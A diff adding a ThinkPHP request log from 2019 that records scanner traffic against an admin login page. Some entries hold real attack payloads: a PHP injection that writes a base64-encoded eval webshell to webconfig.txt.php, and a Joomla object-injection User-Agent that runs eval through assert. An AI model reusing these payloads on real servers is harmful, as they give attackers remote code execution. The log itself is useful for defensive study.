@@ -1,0 +1,101 @@
+---------------------------------------------------------------
+[ 2019-04-08T00:02:21+08:00 ] 74.82.47.2 GET 118.24.8.254/
+[运行时间：0.358965s] [吞吐率：2.79req/s] [内存消耗：343.36kb] [文件加载：69]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.24.8.254',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /www/wuliu/application/admin/view/login/index.html [ array (
+) ]
+---------------------------------------------------------------
+[ 2019-04-08T04:47:24+08:00 ] 37.59.55.45 GET 118.24.8.254/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B
+[运行时间：0.044695s] [吞吐率：22.37req/s] [内存消耗：346.60kb] [文件加载：69]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}𝌆',
+  'connection' => 'close',
+  'host' => '118.24.8.254',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  0 => '@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \'->|\';file_put_contents($_SERVER[\'DOCUMENT_ROOT\'].\'/webconfig.txt.php\',base64_decode(\'PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+\'));echo \'|<-\';',
+)
+[ info ] [ VIEW ] /www/wuliu/application/admin/view/login/index.html [ array (
+) ]
+---------------------------------------------------------------
+[ 2019-04-08T04:47:25+08:00 ] 37.59.55.45 GET 118.24.8.254/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B
+[运行时间：0.002019s] [吞吐率：495.25req/s] [内存消耗：345.20kb] [文件加载：69]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Python-urllib/2.7',
+  'connection' => 'close',
+  'host' => '118.24.8.254',
+  'accept-encoding' => 'identity',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  0 => '@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \'->|\';file_put_contents($_SERVER[\'DOCUMENT_ROOT\'].\'/webconfig.txt.php\',base64_decode(\'PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+\'));echo \'|<-\';',
+)
+[ info ] [ VIEW ] /www/wuliu/application/admin/view/login/index.html [ array (
+) ]
+---------------------------------------------------------------
+[ 2019-04-08T04:47:27+08:00 ] 37.59.55.45 GET 118.24.8.254//administrator/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B
+[运行时间：0.174014s] [吞吐率：5.75req/s] [内存消耗：310.79kb] [文件加载：56]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[ 2019-04-08T14:00:25+08:00 ] 198.108.66.48 GET 118.24.8.254/
+[运行时间：0.270716s] [吞吐率：3.69req/s] [内存消耗：343.73kb] [文件加载：69]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '118.24.8.254',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /www/wuliu/application/admin/view/login/index.html [ array (
+) ]
+---------------------------------------------------------------
+[ 2019-04-08T15:09:35+08:00 ] 138.68.55.201 GET 118.24.8.254:443//ldskflks
+[运行时间：0.044600s] [吞吐率：22.42req/s] [内存消耗：310.83kb] [文件加载：56]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[ 2019-04-08T15:09:36+08:00 ] 138.68.55.201 GET 118.24.8.254:443//login
+[运行时间：0.002225s] [吞吐率：449.45req/s] [内存消耗：310.82kb] [文件加载：56]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+---------------------------------------------------------------
+[ 2019-04-08T22:47:37+08:00 ] 128.14.136.78 GET 118.24.8.254/
+[运行时间：0.242071s] [吞吐率：4.13req/s] [内存消耗：344.13kb] [文件加载：69]
+[ info ] [ LANG ] /www/wuliu/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'host' => '118.24.8.254',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ VIEW ] /www/wuliu/application/admin/view/login/index.html [ array (
+) ]
